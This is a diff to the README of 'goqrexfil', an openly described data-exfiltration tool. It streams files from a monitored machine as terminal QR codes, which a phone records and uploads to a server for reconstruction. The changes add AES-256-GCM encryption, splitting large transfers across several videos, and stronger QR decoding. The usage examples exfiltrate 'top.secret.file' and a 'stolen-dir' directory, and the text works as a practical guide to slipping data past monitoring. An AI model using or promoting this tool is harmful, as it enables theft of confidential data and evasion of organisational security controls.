@@ -19,7 +19,7 @@ the video drops frames — no re-recording required in the common case.
   file / dir / stdin
         │
         ▼
-  smaz compress ──► RaptorQ encode ──► symbol stream (k base + redundancy)
+  [AES-GCM encrypt] ──► zstd compress ──► RaptorQ encode ──► symbol stream (k + redundancy)
                                                         │
                                           each symbol framed + rendered as a
                                           QR code in the terminal (half-blocks)
@@ -31,14 +31,14 @@ the video drops frames — no re-recording required in the common case.
                                               └─────────┬──────────┘
                                                         │  video upload (http/https)
                                                         ▼
-                                     ffmpeg frame extraction ──► QR recognition (per frame)
+                                     ffmpeg frame extraction ──► QR recognition (gozxing
+                                                        │        multi-scale + goqr fallback)
+                                          RaptorQ decode (any solvable subset, per job)
                                                         │
-                                          RaptorQ decode (any solvable subset)
-                                                        │
-                                              smaz decompress
+                                              zstd decompress ──► [AES-GCM decrypt]
                                                         │
                                                         ▼
-                                                  payload.bin  ✓   (or extracted/ dir)
+                                                  payload/jobs/<job>/  ✓
 ```
 
 ## Requirements
@@ -62,36 +62,42 @@ go build -o goqrexfil .
 ```sh
 ./goqrexfil --server                 # http://<server>:9999
 ./goqrexfil --server --token SECRET  # require a shared token
+./goqrexfil --server --key PASSPHRASE  # decrypt encrypted payloads
 ./goqrexfil --server --tls           # HTTPS with a self-signed cert (fingerprint printed)
 ```
 
 **2. Record the QR stream** on the monitored machine. Point your phone at the terminal
-(zoom so the QR fills most of the frame), start recording, wait for the stream, stop:
+(zoom so the QR fills most of the frame). A warm-up pattern is shown first so the phone's
+auto-focus and exposure lock, then the stream starts:
 
 ```sh
 cat top.secret.file | ./goqrexfil --client
 [*] Client mode: ON
 [*] Source: stdin (8.2 KiB)
 Plaintext hash 9f2c...
-[*] 38 base symbols, 57 total (redundancy 50%)
+Verification code K7PD-4MQX
+[*] 38 base symbols, 57 total (redundancy 50%, mode z)
+[*] This video: symbols 1-57 (57 of 57)
 [*] Estimated recording time: ~31s
-[***] Point your phone at this terminal, start recording, then in > 3 < seconds ****
+[***] Point your phone at this terminal; the stream starts in > 3 < seconds ****
 ```
 
 **3. Upload the video** from your phone to `http://<server>:9999/` (add `?token=SECRET`
 if you set one) and submit. The server reconstructs as soon as it has enough symbols and
-responds with a download link:
+responds with a download link and a verification code:
 
 ```
-[*] File received
+[*] File received (job: default)
 [*] received 25 symbols (need ~38)
 [*] Payload reconstructed from 41 symbols (need ~38)
-[*] Payload saved as  ./payload/payload.bin
+[*] Payload saved as  payload/jobs/default/payload.bin
 Payload hash 9f2c...
+Verification code K7PD-4MQX
 ```
 
-Compare the `Plaintext hash` from step 2 with the `Payload hash` from step 3 — they must
-match. Then download the file from `http://<server>:9999/payload`.
+Compare the **verification code** from step 2 with the one from step 3 — they must match
+(a short human-readable check, e.g. `K7PD-4MQX`, instead of comparing long hex hashes by
+eye). Then download the file from `http://<server>:9999/payload`.
 
 ## Why it's reliable: fountain coding
 
@@ -114,11 +120,30 @@ more tolerant of a bad recording.
 ./goqrexfil --client --redundancy 100 top.secret.file   # very robust, ~2x longer
 ```
 
+## Large transfers: split across multiple videos
+
+A single recording has a practical length limit, but a big payload can span **several
+videos**. Because RaptorQ symbols are addressable, the server keeps a **job** and
+accumulates symbols across every upload to that job — it decodes as soon as the *union* of
+all uploaded videos is a solvable subset.
+
+Split the stream with `--start` (first symbol, 1-based) and `--count` (how many):
+
+```sh
+./goqrexfil --client --job big --start 1   --count 20000 ./huge-dir   # video 1
+./goqrexfil --client --job big --start 20001 --count 20000 ./huge-dir # video 2
+./goqrexfil --client --job big --start 40001 ./huge-dir               # video 3 (to the end)
+```
+
+Upload each video to the same job (`job=big` in the form, or `?job=big`). After each upload
+the server reports progress — `Job big in progress: 12345 symbols (need ~26000)` — and
+completes once enough have arrived. `GET /jobs` lists every job and its status.
+
 ## Directory and multi-file exfiltration
 
 Point the client at a directory and it packs everything into a tar.gz with a SHA-256
-manifest; the server unpacks it to `./payload/extracted/` and verifies every file against
-the manifest:
+manifest; the server unpacks it to `payload/jobs/<job>/extracted/` and verifies every file
+against the manifest:
 
 ```sh
 ./goqrexfil --client ./stolen-dir
@@ -136,6 +161,23 @@ estimate, displays nothing):
 ./goqrexfil --client --dry-run ./stolen-dir
 ```
 
+## Encryption
+
+By default the payload is only obfuscated, not protected — anyone who intercepts the video
+can read it. Add `--key` on **both** ends to encrypt the payload with AES-256-GCM before it
+ever becomes QR codes. The key never crosses the channel; the server needs the same
+passphrase to decrypt:
+
+```sh
+# client
+./goqrexfil --client --key "correct horse battery staple" ./top.secret.pdf
+# server
+./goqrexfil --server --key "correct horse battery staple"
+```
+
+The key is turned into a 256-bit key via SHA-256. If the server is given the wrong (or no)
+key, decryption fails and no payload is produced.
+
 ## Self-test (no camera needed)
 
 Verify the whole encode → QR → decode → RaptorQ-reconstruct pipeline locally. It simulates
@@ -143,13 +185,23 @@ an 80% capture and confirms the payload still reconstructs:
 
 ```sh
 cat top.secret.file | ./goqrexfil --selftest
-[*] 26 base symbols, 39 total
-[*] PASS: round-trip OK from 80% of symbols, payload hash 9f2c...
+[*] 26 base symbols, 39 total (mode z)
+[*] PASS: round-trip OK from 80% of symbols, verification code K7PD-4MQX
 ```
 
+Add `--key` to also exercise the encryption path.
+
+## Robust QR decoding
+
+Each extracted frame is decoded by a **ladder**: gozxing (a strong, maintained reader) at
+native, 2×, and 0.5× scale, then the legacy goqr reader as a fallback. The first success
+wins. This makes recognition far more tolerant of compression artifacts, blur, and slight
+scaling than a single reader at one scale.
+
 The repo ships end-to-end tests (`goqrexfil_test.go`) that build a real mp4 from QR frames
-and run the full server pipeline — including a test that **drops 25% of the symbols and
-still reconstructs the payload**:
+and run the full server pipeline — including tests that **drop 25% of the symbols and still
+reconstruct the payload**, **split one payload across two video uploads (job assembly)**,
+and **round-trip an encrypted payload**:
 
 ```sh
 go test ./...
@@ -164,31 +216,37 @@ go test ./...
 | `--client [path]` | Read payload from `path` (file or directory) or stdin, display QR stream |
 | `--client --dry-run` | Show symbol count + time estimate, display nothing |
 | `--client --redundancy N` | RaptorQ redundancy as % of base symbols (default 50) |
+| `--client --key PASSPHRASE` | Encrypt the payload with AES-256-GCM |
+| `--client --job NAME` | Job name (matches the server job for multi-video assembly) |
+| `--client --start N` | First symbol to display (1-based), to split a transfer across videos |
+| `--client --count N` | Number of symbols to display (0 = to the end) |
 | `--client --no-quiet-zone` | Omit the QR quiet zone to save 8 columns (narrow terminals) |
+| `--client --no-warmup` | Skip the warm-up focus/exposure pattern |
 | `--server` | Web server on port 9999: upload video, reconstruct payload |
 | `--server --token SECRET` | Require the shared token on upload/download |
+| `--server --key PASSPHRASE` | Decrypt encrypted payloads |
 | `--server --tls` | Serve over TLS (self-signed cert, fingerprint printed) |
 | `--server --tls-cert C --tls-key K` | Use your own TLS cert/key |
 | `--selftest [path]` | Local round-trip test of the QR pipeline, no camera needed |
-| `--retrievePayload` | Re-process `./public/video.mp4` without the web server (debug) |
+| `--retrievePayload --job NAME` | Re-process `./public/video.mp4` without the web server (debug) |
 
 ### Server endpoints
 
 | Endpoint | Description |
 | --- | --- |
 | `GET /` | Upload form (add `?token=…` if a token is set) |
-| `POST /upload` | Upload the video (multipart field `file`, max 512 MB); returns download link or a "re-record" notice |
-| `GET /payload` | Download the reconstructed payload |
-| `GET /missing` | Advisory: how the fountain-coded recovery works |
+| `POST /upload` | Upload a video (multipart `file`, max 512 MB; `job` field selects the job); returns download link, progress, or a "re-record" notice |
+| `GET /payload?job=NAME` | Download the reconstructed payload for a job |
+| `GET /jobs` | List all jobs and their status (received/needed symbols, verification code) |
 | `GET /process/` | Static access to extracted frames (debugging) |
 
 ### The symbol protocol
 
-Each QR code encodes `GQ2:<compressedLen>:<symbolID>:<base64(symbol)>` where
-`<compressedLen>` is the exact byte length of the smaz-compressed payload (the RaptorQ
-decoder needs it), `<symbolID>` indexes the fountain symbol, and `<base64(symbol)>` is a
-~240-byte RaptorQ symbol. The `:` separators cannot appear in base64, so framing is
-unambiguous.
+Each QR code encodes `GQ3:<mode>:<blobLen>:<symbolID>:<base64(symbol)>` where `<mode>` is
+`z` (zstd-compressed) or `ze` (zstd-compressed then AES-GCM encrypted), `<blobLen>` is the
+exact byte length of that blob (the RaptorQ decoder needs it), `<symbolID>` indexes the
+fountain symbol, and `<base64(symbol)>` is a ~240-byte RaptorQ symbol. The `:` separators
+cannot appear in base64, so framing is unambiguous.
 
 ## Throughput
 
@@ -205,7 +263,7 @@ for your payload:
 | 1 MB | ~7,900 | ~70 min |
 | 10 MB | ~79,000 | ~12 h |
 
-Compressible payloads (text, PDFs, source) shrink under smaz and transfer proportionally
+Compressible payloads (text, PDFs, source) shrink under zstd and transfer proportionally
 faster. Lower `--redundancy` shortens the video at the cost of less tolerance for a bad
 recording.
 
